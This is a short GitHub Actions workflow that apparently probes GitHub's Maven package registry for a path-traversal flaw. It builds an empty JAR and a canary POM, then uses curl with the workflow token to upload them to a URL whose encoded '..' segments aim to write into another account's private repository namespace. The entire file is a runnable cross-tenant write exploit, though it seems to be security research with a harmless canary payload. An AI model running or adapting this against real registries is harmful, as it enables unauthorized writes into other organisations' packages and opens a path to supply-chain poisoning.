name: G10 Maven path boundary differential
on:
  push:
    paths:
      - .github/workflows/g10-maven-parser.yml
permissions:
  contents: read
  packages: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Probe encoded Maven namespace traversal
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -eux
          mkdir -p /tmp/g10m/empty
          jar cf /tmp/g10m/g10-cross-write-20260803.jar -C /tmp/g10m/empty .
          cat > /tmp/g10m/g10-cross-write-20260803.pom <<EOF
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.apexblack.g10</groupId>
            <artifactId>g10-cross-write-20260803</artifactId>
            <version>1.0.0</version>
            <packaging>jar</packaging>
            <description>PRIMARY-PATH-TRAVERSAL-CANARY</description>
          </project>
          EOF
          base=https://maven.pkg.github.com/apexblack-koala-274804/chainship-test-release/%2e%2e/%2e%2e/apexblack-kangaroo-1782761273/g10-cross-primary-private-30853164675/com/apexblack/g10/g10-cross-write-20260803/1.0.0
          curl -fsS -u "$GITHUB_ACTOR:$GITHUB_TOKEN" --upload-file /tmp/g10m/g10-cross-write-20260803.jar "$base/g10-cross-write-20260803-1.0.0.jar"
          curl -fsS -u "$GITHUB_ACTOR:$GITHUB_TOKEN" -H "Content-Type: application/xml" --upload-file /tmp/g10m/g10-cross-write-20260803.pom "$base/g10-cross-write-20260803-1.0.0.pom"
